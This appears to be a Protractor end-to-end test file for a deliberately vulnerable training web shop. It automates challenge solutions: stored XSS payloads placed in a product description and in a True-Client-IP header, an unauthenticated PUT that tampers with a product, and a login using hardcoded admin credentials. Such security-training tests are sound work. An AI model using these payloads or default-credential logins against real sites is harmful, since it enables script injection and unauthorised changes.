const config = require('config')
const tamperingProductId = ((() => {
  const products = config.get('products')
  for (let i = 0; i < products.length; i++) {
    if (products[i].urlForProductTamperingChallenge) {
      return i + 1
    }
  }
})())

describe('/rest', () => {
  describe('challenge "xss3"', () => {
    protractor.beforeEach.login({ email: 'admin@' + config.get('application.domain'), password: 'admin123' })

    xit('should be possible to create a new product when logged in', () => {
      const EC = protractor.ExpectedConditions
      browser.waitForAngularEnabled(false)
      browser.executeScript('var $http = angular.element(document.body).injector().get(\'$http\'); $http.post(\'/api/Products\', {name: \'XSS3\', description: \'<iframe src="javascript:alert(xss)">\', price: 47.11});')
      browser.driver.sleep(1000)
      browser.waitForAngularEnabled(true)

      browser.get('/#/search')
      browser.wait(EC.alertIsPresent(), 5000, "'XSS' alert is not present")
      browser.switchTo().alert().then(
        alert => {
          expect(alert.getText()).toEqual('XSS')
          alert.accept()

          browser.waitForAngularEnabled(false)
          browser.executeScript('var $http = angular.element(document.body).injector().get(\'$http\'); $http.put(\'/api/Products/' + (config.get('products').length + 1) + '\', {description: \'alert disabled\'});')
          browser.driver.sleep(1000)
          browser.waitForAngularEnabled(true)
        })
    })

    // protractor.expect.challengeSolved({challenge: 'XSS Tier 3'})
  })

  describe('challenge "xss5"', () => {
    protractor.beforeEach.login({ email: 'admin@' + config.get('application.domain'), password: 'admin123' })

    xit('should be possible to save log-in IP when logged in', () => {
      browser.waitForAngularEnabled(false)
      browser.executeScript('var $http = angular.element(document.body).injector().get(\'$http\'); $http.get(\'/rest/saveLoginIp\',{headers: {\'True-Client-IP\': \'<iframe src="javascript:alert(xss)">\'}});')
      browser.driver.sleep(1000)
      browser.waitForAngularEnabled(true)
    })

    protractor.expect.challengeSolved({ challenge: 'XSS Tier 5' })
  })

  describe('challenge "changeProduct"', () => {
    it('should be possible to change product via PUT request without being logged in', () => {
      browser.waitForAngularEnabled(false)
      browser.executeScript(`var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 200) { console.log("Success"); } }; xhttp.open("PUT","${"http://localhost:3000/api/Products/" + tamperingProductId}", true); xhttp.setRequestHeader("Content-type","application/json"); xhttp.send(JSON.stringify({"description" : "<a href=\\"http://kimminich.de\\" target=\\"_blank\\">More...</a>"}));`) // eslint-disable-line
      browser.driver.sleep(1000)
      browser.waitForAngularEnabled(true)

      browser.get('/#/search')
    })

    protractor.expect.challengeSolved({ challenge: 'Product Tampering' })
  })
})

describe('/rest/saveLoginIp', () => {
  it('should not be possible to save log-in IP when not logged in', () => {
    browser.waitForAngularEnabled(false)
    browser.get('/rest/saveLoginIp')
    var el = element(by.css('pre'))
    el.getText().then(function (text) {
      expect(text).toMatch('Unauthorized')
    })
    browser.driver.sleep(1000)
    browser.waitForAngularEnabled(true)
  })
})
